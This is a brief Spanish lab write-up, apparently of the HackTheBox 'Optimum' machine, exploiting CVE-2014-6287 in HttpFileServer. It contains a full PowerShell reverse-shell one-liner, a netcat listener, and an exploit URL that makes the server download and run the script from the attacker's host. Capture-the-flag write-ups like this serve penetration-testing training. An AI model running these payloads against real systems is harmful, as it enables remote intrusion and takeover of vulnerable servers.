#CVE-2014-6287

------

Vamos a crear un archivo reverse.ps1 con el siguiente payload. Esto lo sacamos de [payloadallthethings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)

![[Optimum10.png]]
Vamos a usar el script de [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) para mandarnos la [[Reverse shell]]

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


Vamos a estar hosteando el archivo con un server de [[python3 -m http.server]] con el comando `python3 -m http.server 80` para que se descarge el archivo *reverse.ps1* con el cual vamos a inyectar el payload

![[Optimum9.png]]
Mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] 

Ejecutamos la vulnerabilidad mediante este link, solamente cambiando la ip desde la cual se va a descargar el archivo

`http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(%27http%3a//10.10.16.15/reverse.ps1%27).}`

![[Optimum7 1.png]]
Ya estamos adentro de la maquina
